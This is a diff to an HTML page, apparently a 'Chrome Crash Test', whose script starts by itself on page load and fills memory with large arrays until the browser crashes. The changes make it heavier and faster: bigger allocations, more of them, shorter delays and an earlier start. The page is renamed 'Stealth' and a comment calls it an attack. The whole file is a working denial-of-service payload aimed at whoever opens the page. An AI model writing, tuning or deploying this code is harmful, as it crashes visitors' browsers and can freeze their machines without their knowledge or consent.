@@ -1,22 +1,22 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Chrome Crash Test - Delayed Memory Overload</title>
+    <title>Chrome Crash Test - Optimized Stealth Overload</title>
 </head>
 <body>
-    <h1>Chrome Crash Test - Delayed Memory Overload</h1>
+    <h1>Chrome Crash Test - Optimized Stealth Overload</h1>
     <p>If your browser crashes, the test was successful.</p>
 
     <script>
         let memoryChunks = [];
-        let delay = 10; // Milliseconds delay between each allocation
-        let maxAllocations = 500; // Adjust based on your system's tolerance
+        let delay = 2; // Shorter delay (in ms) between allocations
+        let maxAllocations = 1000; // Increased max memory blocks
 
         function allocateMemory() {
             try {
-                memoryChunks.push(new Float64Array(2e7)); // Gradually allocate memory
+                memoryChunks.push(new Float64Array(5e7)); // Increased allocation size
                 if (memoryChunks.length < maxAllocations) {
-                    setTimeout(allocateMemory, delay); // Slowly increase load
+                    setTimeout(allocateMemory, delay); // Keep allocating faster
                 } else {
                     console.log("Max memory allocated, waiting for impact...");
                 }
@@ -26,12 +26,11 @@
         }
 
         function startTest() {
-            console.log("Starting Delayed Memory Exhaustion...");
+            console.log("Starting Optimized Stealth Memory Exhaustion...");
             allocateMemory();
         }
 
-        // Auto-start the memory exhaustion after a short delay
-        setTimeout(startTest, 3000);
+        setTimeout(startTest, 1000); // Start attack after 1 second
     </script>
 </body>
 </html>
